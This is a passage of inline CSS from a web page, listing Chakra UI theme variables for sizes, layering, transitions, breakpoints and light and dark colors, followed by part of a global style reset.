40px;--chakra-sizes-1:0.25rem;--chakra-sizes-2:0.5rem;--chakra-sizes-3:0.75rem;--chakra-sizes-4:1rem;--chakra-sizes-5:1.25rem;--chakra-sizes-6:1.5rem;--chakra-sizes-7:1.75rem;--chakra-sizes-8:2rem;--chakra-sizes-9:2.25rem;--chakra-sizes-10:2.5rem;--chakra-sizes-12:3rem;--chakra-sizes-14:3.5rem;--chakra-sizes-16:4rem;--chakra-sizes-20:5rem;--chakra-sizes-24:6rem;--chakra-sizes-28:7rem;--chakra-sizes-32:8rem;--chakra-sizes-36:9rem;--chakra-sizes-40:10rem;--chakra-sizes-44:11rem;--chakra-sizes-48:12rem;--chakra-sizes-52:13rem;--chakra-sizes-56:14rem;--chakra-sizes-60:15rem;--chakra-sizes-64:16rem;--chakra-sizes-72:18rem;--chakra-sizes-80:20rem;--chakra-sizes-96:24rem;--chakra-sizes-px:1px;--chakra-sizes-0-5:0.125rem;--chakra-sizes-1-5:0.375rem;--chakra-sizes-2-5:0.625rem;--chakra-sizes-3-5:0.875rem;--chakra-sizes-max:max-content;--chakra-sizes-min:min-content;--chakra-sizes-full:100%;--chakra-sizes-3xs:14rem;--chakra-sizes-2xs:16rem;--chakra-sizes-xs:20rem;--chakra-sizes-sm:24rem;--chakra-sizes-md:28rem;--chakra-sizes-lg:32rem;--chakra-sizes-xl:36rem;--chakra-sizes-2xl:42rem;--chakra-sizes-3xl:48rem;--chakra-sizes-4xl:56rem;--chakra-sizes-5xl:64rem;--chakra-sizes-6xl:72rem;--chakra-sizes-7xl:80rem;--chakra-sizes-8xl:90rem;--chakra-sizes-prose:60ch;--chakra-sizes-container-sm:30em;--chakra-sizes-container-md:48em;--chakra-sizes-container-lg:62em;--chakra-sizes-container-xl:80em;--chakra-sizes-container-2xl:96em;--chakra-zIndices-hide:-1;--chakra-zIndices-auto:auto;--chakra-zIndices-base:0;--chakra-zIndices-docked:10;--chakra-zIndices-dropdown:1000;--chakra-zIndices-sticky:1100;--chakra-zIndices-banner:1200;--chakra-zIndices-overlay:1300;--chakra-zIndices-modal:1400;--chakra-zIndices-popover:1500;--chakra-zIndices-skipLink:1600;--chakra-zIndices-toast:1700;--chakra-zIndices-tooltip:1800;--chakra-transition-property-common:background-color,border-color,color,fill,stroke,opacity,box-shadow,transform;--chakra-transition-property-colors:background-color,border-color,color,fill,stroke;--chakra-transition-property-dimensions:width,height;--chakra-transition-property-position:left,right,top,bottom;--chakra-transition-property-background:background-color,background-image,background-position;--chakra-transition-easing-ease-in:cubic-bezier(0.4, 0, 1, 1);--chakra-transition-easing-ease-out:cubic-bezier(0, 0, 0.2, 1);--chakra-transition-easing-ease-in-out:cubic-bezier(0.4, 0, 0.2, 1);--chakra-transition-duration-ultra-fast:50ms;--chakra-transition-duration-faster:100ms;--chakra-transition-duration-fast:150ms;--chakra-transition-duration-normal:200ms;--chakra-transition-duration-slow:300ms;--chakra-transition-duration-slower:400ms;--chakra-transition-duration-ultra-slow:500ms;--chakra-blur-none:0;--chakra-blur-sm:4px;--chakra-blur-base:8px;--chakra-blur-md:12px;--chakra-blur-lg:16px;--chakra-blur-xl:24px;--chakra-blur-2xl:40px;--chakra-blur-3xl:64px;--chakra-breakpoints-base:0em;--chakra-breakpoints-sm:30em;--chakra-breakpoints-md:48em;--chakra-breakpoints-lg:62em;--chakra-breakpoints-xl:80em;--chakra-breakpoints-2xl:96em;--chakra-colors-presence-online:var(--chakra-colors-green-500);--chakra-colors-presence-offline:var(--chakra-colors-gray-400);--chakra-colors-presence-busy:var(--chakra-colors-orange-500);--chakra-colors-presence-dnd:var(--chakra-colors-red-500);--chakra-colors-presence-away:var(--chakra-colors-gray-400);--chakra-colors-muted:var(--chakra-colors-gray-500);--chakra-colors-neutral:var(--chakra-colors-black);--chakra-colors-neutral-fg:var(--chakra-colors-white);}.chakra-ui-light :host:not([data-theme]),.chakra-ui-light :root:not([data-theme]),.chakra-ui-light [data-theme]:not([data-theme]),[data-theme=light] :host:not([data-theme]),[data-theme=light] :root:not([data-theme]),[data-theme=light] [data-theme]:not([data-theme]),:host[data-theme=light],:root[data-theme=light],[data-theme][data-theme=light]{--chakra-colors-chakra-body-text:var(--chakra-colors-gray-800);--chakra-colors-chakra-body-bg:var(--chakra-colors-white);--chakra-colors-chakra-border-color:var(--chakra-colors-gray-200);--chakra-colors-chakra-inverse-text:var(--chakra-colors-white);--chakra-colors-chakra-subtle-bg:var(--chakra-colors-gray-100);--chakra-colors-chakra-subtle-text:var(--chakra-colors-gray-600);--chakra-colors-chakra-placeholder-color:var(--chakra-colors-gray-500);}.chakra-ui-dark :host:not([data-theme]),.chakra-ui-dark :root:not([data-theme]),.chakra-ui-dark [data-theme]:not([data-theme]),[data-theme=dark] :host:not([data-theme]),[data-theme=dark] :root:not([data-theme]),[data-theme=dark] [data-theme]:not([data-theme]),:host[data-theme=dark],:root[data-theme=dark],[data-theme][data-theme=dark]{--chakra-colors-chakra-body-text:var(--chakra-colors-whiteAlpha-900);--chakra-colors-chakra-body-bg:var(--chakra-colors-gray-800);--chakra-colors-chakra-border-color:var(--chakra-colors-whiteAlpha-200);--chakra-colors-chakra-inverse-text:var(--chakra-colors-gray-800);--chakra-colors-chakra-subtle-bg:var(--chakra-colors-gray-700);--chakra-colors-chakra-subtle-text:var(--chakra-colors-gray-400);--chakra-colors-chakra-placeholder-color:var(--chakra-colors-whiteAlpha-400);--chakra-colors-muted:var(--chakra-colors-gray-400);--chakra-colors-neutral:var(--chakra-colors-white);--chakra-colors-neutral-fg:var(--chakra-colors-black);}</style><style data-emotion="css-global fubdgu">html{line-height:1.5;-webkit-text-size-adjust:100%;font-family:system-ui,sans-serif;-webkit-font-smoothing:antialiased;text-rendering:optimizeLegibility;-moz-osx-font-smoothing:grayscale;touch-action:manipulation;}body{position:relative;min-height:100%;margin:0;font-feature-settings:"kern";}:where(*, *::before, *::after){border-width:0;border-style:solid;box-sizing:border-box;word-wrap:break-word;}main{display:block;}hr{border-top-width:1px;box-sizing:content-box;height:0;overflow:visible;}:where(pre, code, kbd,samp){font-family:SFMono-Regular,Menlo,Monaco,Consolas,monospace;font-size:1em;}a{background-color:transparent;color:inherit;-webkit-text-decoration:inherit;text-decoration:inherit;}abbr[title]{border-bottom:none;-webkit-text-decoration:underline;text-decoration:underline;-webkit-text-decoration:underline dotted;-webkit-text-decoration:underline dotted;text-decoration:underline dotted;}:where(b, strong){font-weight:bold;}small{font-size:80%;}:where(sub,sup){font-size:75%;line-height:0;position:relative;vertical-align:baseline;}sub{bottom:-0.25em;}sup{top:-0.5em;}img{border-style:none;}:where(button, input, optgroup, select, textarea){font-family:inherit;font-size:100%;line-height:1.15;margin:0;}:where(button, input){overflow:visible;}:where(button, select){text-transform:none;}:where(
